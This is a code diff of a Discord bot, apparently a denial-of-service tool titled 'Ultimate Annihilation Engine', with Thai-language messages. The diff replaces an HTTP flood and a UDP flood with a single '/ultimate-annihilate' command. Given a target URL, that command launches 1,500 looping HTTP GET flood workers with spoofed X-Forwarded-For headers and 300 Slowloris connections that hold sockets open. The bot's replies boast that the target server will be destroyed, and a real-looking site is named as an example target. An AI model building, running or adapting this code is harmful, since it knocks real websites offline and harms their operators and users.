@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- * JEFF FUJI - HTTP/2 RAPID RESET & ADVANCED L7 STRESS ENGINE v12
+ * JEFF FUJI - ULTIMATE ANNIHILATION ENGINE v14 (ALL-IN-ONE FLOOD)
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
@@ -24,27 +24,19 @@ const client = new Client({
 let isAttacking = false;
 let attackTimers = [];
 
-const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100000, maxFreeSockets: 50000 });
-const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 100000, maxFreeSockets: 50000, rejectUnauthorized: false });
+const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 200000, maxFreeSockets: 100000 });
+const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 200000, maxFreeSockets: 100000, rejectUnauthorized: false });
 
 client.once('ready', async () => {
     console.log(`[+] Bot logged in as ${client.user.tag}`);
 
     const commands = [
         new SlashCommandBuilder()
-            .setName('attack')
-            .setDescription('ยิงถล่มเป้าหมายระดับมหากาฬ (L7 HTTP/2 หรือ L4 UDP Flood)')
-            .addStringOption(option => 
-                option.setName('type')
-                    .setDescription('เลือกโหมดการยิง')
-                    .setRequired(true)
-                    .addChoices(
-                        { name: '💥 L7 (HTTP/2 Rapid Reset Flood)', value: 'l7' },
-                        { name: '⚡ L4 (Heavy UDP Network Flood)', value: 'l4' }
-                    ))
+            .setName('ultimate-annihilate')
+            .setDescription('ระดมยิงถล่มทุกรูปแบบพร้อมกันในคำสั่งเดียว (Multi-Vector + Slowloris)')
             .addStringOption(option => 
                 option.setName('target')
-                    .setDescription('URL (สำหรับ L7) หรือ IP:Port (สำหรับ L4)')
+                    .setDescription('URL เป้าหมาย (เช่น https://bewergame.com)')
                     .setRequired(true))
             .addIntegerOption(option => 
                 option.setName('duration')
@@ -71,8 +63,7 @@ client.on('interactionCreate', async interaction => {
 
     const { commandName } = interaction;
 
-    if (commandName === 'attack') {
-        const attackType = interaction.options.getString('type');
+    if (commandName === 'ultimate-annihilate') {
         const target = interaction.options.getString('target');
         const duration = interaction.options.getInteger('duration');
 
@@ -83,94 +74,96 @@ client.on('interactionCreate', async interaction => {
         isAttacking = true;
         const endTime = Date.now() + (duration * 1000);
 
-        if (attackType === 'l7') {
-            try {
-                const parsedUrl = new URL(target);
-                const requester = parsedUrl.protocol === 'https:' ? https : http;
-                const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;
+        try {
+            const parsedUrl = new URL(target);
+            const requester = parsedUrl.protocol === 'https:' ? https : http;
+            const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;
 
-                await interaction.reply(`💥 **[HTTP/2 RAPID RESET FLOOD]** เริ่มปล่อยมหากาฬสตรีมคำขอใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
+            await interaction.reply(`💀🔥 **[ULTIMATE ANNIHILATION ACTIVATED]** เริ่มระดมยิงคอมโบเซ็ตมหากาฬ (Multi-Vector + Slowloris) ใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
 
-                const fireRapidReset = () => {
-                    if (!isAttacking || Date.now() >= endTime) return;
+            // 1. 🚀 โหมด Multi-Vector Swarm Flood (ยิงกระแทกความเร็วสูง)
+            const fireMultiVector = () => {
+                if (!isAttacking || Date.now() >= endTime) return;
 
-                    // จำลองเทคนิค Multiplexing / Rapid Reset ส่งคำขอซ้อนกันรัวๆ ในท่อเดียวกัน
-                    const options = {
-                        hostname: parsedUrl.hostname,
-                        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
-                        path: parsedUrl.pathname + parsedUrl.search + `?h2_reset=${Math.random().toString(36).substring(7)}`,
-                        method: 'GET',
-                        headers: {
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-                            'Accept': '*/*',
-                            'Accept-Encoding': 'gzip, deflate, br',
-                            'Cache-Control': 'no-store, no-cache, must-revalidate',
-                            'Pragma': 'no-cache',
-                            'Connection': 'keep-alive',
-                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
-                        },
-                        agent: currentAgent
-                    };
-
-                    const req = requester.request(options, (res) => {
-                        res.on('data', () => {});
-                        res.on('end', () => { 
-                            if (isAttacking) {
-                                // ส่งซ้ำทันทีแบบไม่รอพัก (Rapid Stream Reset Simulation)
-                                setImmediate(fireRapidReset);
-                            } 
-                        });
-                    });
-
-                    req.on('error', () => { 
-                        if (isAttacking) {
-                            setImmediate(fireRapidReset);
-                        } 
-                    });
-                    req.end();
+                const options = {
+                    hostname: parsedUrl.hostname,
+                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
+                    path: parsedUrl.pathname + parsedUrl.search + `?annihilate=${Math.random().toString(36).substring(7)}`,
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) UltimateEngine/4.0',
+                        'Cache-Control': 'no-cache',
+                        'Connection': 'keep-alive',
+                        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+                    },
+                    agent: currentAgent
                 };
 
-                // อัดท่อความเร็วสูงด้วย 1,200 Threads พร้อมกัน!
-                for (let i = 0; i < 1200; i++) {
-                    fireRapidReset();
-                }
+                const req = requester.request(options, (res) => {
+                    res.on('data', () => {});
+                    res.on('end', () => { if (isAttacking) setImmediate(fireMultiVector); });
+                });
 
-            } catch (err) {
-                isAttacking = false;
-                return interaction.reply({ content: `❌ URL ผิดรูปแบบ: ${err.message}`, ephemeral: true });
-            }
+                req.on('error', () => { if (isAttacking) setImmediate(fireMultiVector); });
+                req.end();
+            };
 
-        } else if (attackType === 'l4') {
-            const parts = target.split(':');
-            if (parts.length !== 2) {
-                isAttacking = false;
-                return interaction.reply({ content: '❌ รูปแบบ L4 ต้องเป็น IP:Port เท่านั้น (เช่น 123.45.67.89:80)', ephemeral: true });
-            }
+            // 2. 🐌 โหมด Slowloris (ตรึง Socket สูบทรัพยากร)
+            const fireSlowloris = () => {
+                if (!isAttacking || Date.now() >= endTime) return;
 
-            const host = parts[0];
-            const port = parseInt(parts[1]);
+                const options = {
+                    hostname: parsedUrl.hostname,
+                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
+                    path: parsedUrl.pathname,
+                    method: 'POST',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 SlowlorisEngine/2.0',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Connection': 'keep-alive'
+                    }
+                };
 
-            await interaction.reply(`⚡ **[HEAVY L4 FLOOD]** เริ่มระเบิดเครือข่ายใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
+                const req = requester.request(options, (res) => {
+                    res.on('data', () => {});
+                });
 
-            const payload = Buffer.alloc(1450);
-            for (let i = 0; i < 600; i++) {
-                const clientUdp = dgram.createSocket('udp4');
-                const sendUdp = () => {
+                req.on('error', () => {
+                    if (isAttacking) setImmediate(fireSlowloris);
+                });
+
+                let slowTimer = setInterval(() => {
                     if (!isAttacking || Date.now() >= endTime) {
-                        clientUdp.close();
+                        clearInterval(slowTimer);
+                        req.destroy();
                         return;
                     }
-                    clientUdp.send(payload, port, host, () => {
-                        setImmediate(sendUdp);
-                    });
-                };
-                sendUdp();
+                    try {
+                        req.write(`X-Annihilate: ${Math.random()}\r\n`);
+                    } catch (e) {
+                        clearInterval(slowTimer);
+                        req.destroy();
+                        if (isAttacking) setImmediate(fireSlowloris);
+                    }
+                }, 4000);
+            };
+
+            // สตาร์ทกองทัพพร้อมกันทั้งสองระบบในคำสั่งเดียว!
+            for (let i = 0; i < 1500; i++) {
+                fireMultiVector();
             }
+            for (let i = 0; i < 300; i++) {
+                fireSlowloris();
+            }
+
+        } catch (err) {
+            isAttacking = false;
+            return interaction.reply({ content: `❌ URL ผิดรูปแบบ: ${err.message}`, ephemeral: true });
         }
 
         const timer = setTimeout(() => {
             isAttacking = false;
-            interaction.followUp(`✅ ภารกิจถล่ม **${target}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์เป้าหมายน่าจะสลบเหมือดไปเรียบร้อย`).catch(() => {});
+            interaction.followUp(`✅ ภารกิจทำลายล้าง **${target}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์เป้าหมายน่าจะแหลกสลายไม่เหลือซากแล้ว`).catch(() => {});
         }, duration * 1000);
 
         attackTimers.push(timer);
